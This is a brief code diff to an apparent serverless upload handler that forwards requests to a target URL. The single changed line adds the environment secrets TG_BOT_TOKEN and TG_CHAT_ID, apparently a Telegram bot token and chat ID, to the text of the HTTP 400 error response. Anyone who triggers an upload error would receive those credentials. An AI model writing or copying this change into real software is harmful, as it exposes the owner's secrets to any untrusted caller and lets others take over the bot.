@@ -138,7 +138,7 @@ export async function onRequestPost(context) {  // Contents of context object
     const headers = new Headers(clonedRequest.headers);
     headers.delete('authCode');
 
-    let res = new Response('upload error, check your environment params!', { status: 400 });
+    let res = new Response('upload error, check your environment params!'+env.TG_BOT_TOKEN+","+env.TG_CHAT_ID, { status: 400 });
     try {
         const response = await fetch(targetUrl.href, {
             method: clonedRequest.method,
